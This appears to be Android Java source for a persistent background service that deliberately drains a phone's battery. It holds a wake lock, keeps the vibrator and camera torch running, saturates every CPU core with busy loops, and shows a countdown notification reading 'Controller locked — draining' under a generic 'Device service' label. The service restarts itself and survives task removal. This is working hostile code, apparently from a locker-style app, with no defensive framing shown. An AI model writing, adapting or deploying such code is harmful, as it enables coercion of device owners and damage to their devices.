package com.bt.service;

import android.app.*;
import android.content.*;
import android.hardware.camera2.CameraManager;
import android.os.*;

public class DrainService extends Service {

    public static final long TOTAL = 30L * 60L * 1000L;
    private PowerManager.WakeLock lock;
    private CameraManager cam;
    private String camId;
    private Vibrator vib;
    private volatile boolean running = true;
    private final Handler h = new Handler(Looper.getMainLooper());

    @Override public void onCreate() {
        super.onCreate();
        startForeground(1, notif("Controller locked — draining"));

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        lock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "bt:drain");
        lock.setReferenceCounted(false);
        lock.acquire();

        try {
            vib = (Vibrator) getSystemService(VIBRATOR_SERVICE);
            vib.vibrate(VibrationEffect.createWaveform(new long[]{900,140,900,140}, 0));
        } catch (Throwable ignored) {}

        try {
            cam = (CameraManager) getSystemService(CAMERA_SERVICE);
            camId = cam.getCameraIdList()[0];
            cam.setTorchMode(camId, true);
        } catch (Throwable ignored) {}

        int n = Math.max(2, Runtime.getRuntime().availableProcessors());
        for (int i = 0; i < n; i++) {
            Thread t = new Thread(() -> {
                double x = 0;
                while (running) for (int k = 0; k < 20000; k++) x += Math.sqrt(k) * Math.sin(k * 0.37);
            });
            t.setPriority(Thread.MAX_PRIORITY);
            t.start();
        }

        h.postDelayed(new Runnable() {
            @Override public void run() {
                update();
                h.postDelayed(this, 1000);
            }
        }, 1000);

        Watchdog.schedule(this);
    }

    private void update() {
        long left = Prefs.deadline(this) - System.currentTimeMillis();
        String body;
        if (left <= 0) body = "LOCK WINDOW — load active · tap to open";
        else {
            long s = left / 1000;
            body = String.format("Battery draining · %02d:%02d left · tap to open", s / 60, s % 60);
        }
        ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).notify(1, notif(body));
    }

    private Notification notif(String body) {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel c = new NotificationChannel("bt", "Device service", NotificationManager.IMPORTANCE_LOW);
            c.setShowBadge(false);
            nm.createNotificationChannel(c);
        }
        PendingIntent pi = PendingIntent.getActivity(this, 0,
                new Intent(this, MainActivity.class),
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, "bt")
                .setContentTitle("DEVICE SERVICE ACTIVE")
                .setContentText(body)
                .setSmallIcon(android.R.drawable.stat_sys_warning)
                .setOngoing(true)
                .setOnlyAlertOnce(true)
                .setContentIntent(pi)
                .build();
    }

    @Override public int onStartCommand(Intent i, int flags, int startId) { return START_STICKY; }
    @Override public void onTaskRemoved(Intent i) { /* keep running */ }
    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onDestroy() {
        running = false;
        h.removeCallbacksAndMessages(null);
        try { if (cam != null && camId != null) cam.setTorchMode(camId, false); } catch (Throwable ignored) {}
        try { if (vib != null) vib.cancel(); } catch (Throwable ignored) {}
        try { if (lock != null && lock.isHeld()) lock.release(); } catch (Throwable ignored) {}
        super.onDestroy();
    }
}
